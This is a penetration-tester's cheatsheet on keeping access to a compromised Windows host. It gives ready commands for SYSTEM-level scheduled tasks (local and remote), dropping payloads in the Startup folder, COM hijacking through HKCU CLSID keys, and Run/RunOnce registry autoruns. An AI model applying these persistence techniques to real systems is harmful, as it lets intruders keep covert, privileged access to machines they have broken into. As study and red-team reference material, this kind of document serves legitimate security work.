## Maintaining Access

Looking forward to updating this with some super cool tricks once I've taken the persistence course from Sektor7! For now, this will have to do. This file focuses on maintaining access to a singular host locally. Domain persistence is covered in the Domain Persistence Methods file.

For this, you can use SharPersist from Mandiant to automate the steps.

 https://github.com/mandiant/SharPersist 


## Scheduled Tasks

We can add a scheduled task to execute on the target to revive persistence when we need it. This can be run on the local machine or remote machine (Requires HOST SPN).

```powershell
# Adds a task to run as SYSTEM daily on the localmachine
schtasks /create /SC weekly /RU "NT Authority\SYSTEM" /TN "bowser" /TR "C:\parrot.exe"

# Adds a task called bowser which executes parrot.exe weekly as SYSTEM on dc04.example.com
schtasks /create /S dc04.example.com /SC weekly /RU "NT Authority\SYSTEM" /TN "bowser" /TR "C:\parrot.exe"

# Force run a scheduled task
schtasks /Run /TN "bowser"
schtasks /Run /S dc04.example.com /TN "bowser"
```

## Startup Folders

Stick a malicious file in the user's startup folder. Whenever they login, it gets triggered. 

```powershell
C:\Users\toby\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\placeyourfilehere
```


## COM Hijacking

A complex topic and not really an area that I'm covering in a cheatsheet. In essence, we're abusing the fact the COM (Common Object Model) first looks in HKCU for a DLL before looking in HKLM. Therefore, if a valid DLL is being loaded from HKLM and HKCU is empty, we can edit the registry of HKCU to "hijack" the execution flow and force exection of our malicious binary.

https://cyberstruggle.org/com-hijacking-for-persistence/

We can use the Task Scheduler as many default tasks have custom triggers that call COM objects. 
```powershell
$Tasks = Get-ScheduledTask  
  
foreach ($Task in $Tasks)  
{  
	 if ($Task.Actions.ClassId -ne $null)  
	 {  
		 if ($Task.Triggers.Enabled -eq $true)  
		 {  
			 if ($Task.Principal.GroupId -eq "Users")  
			 {  
				 Write-Host "Task Name: " $Task.TaskName  
				 Write-Host "Task Path: " $Task.TaskPath  
				 Write-Host "CLSID: " $Task.Actions.ClassId  
				 Write-Host  
			 }  
		 }  
	 }  
}
```

Search tasks names in the output and check whether the CLSID is registered in just HKLM. If it is, then we can add a DLL in HKCU and obtain persistence - Dependant on how often the task is triggered.

```powershell
# Find the name of a discovered CLSID and its property
Get-ChildItem -Path "Registry::HKCR\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\MsCtfMonitor.dll
               ThreadingModel : Both

# Check it exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize
Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# It doesn't exist in HKCU
Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.

# Add a new item
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
New-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" -Name "InprocServer32" -Value "C:\malicious.dlls"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```


## Registry Auto Run Keys

We can stick some items in the registry to autorun when a user logs in. If we have elevated privileges, we're best off using the HKLM as then it will execute whenever the system turns on rather just when a specific user logs in. Obviously Run and RunOnce will run persistently or just once.

```powershell
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Matrix /t REG_SZ /d "C:\parrot.exe"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Matrix /t REG_SZ /d "C:\parrot.exe"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v Matrix /t REG_SZ /d "C:\parrot.exe"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Matrix /t REG_SZ /d "C:\parrot.exe"
```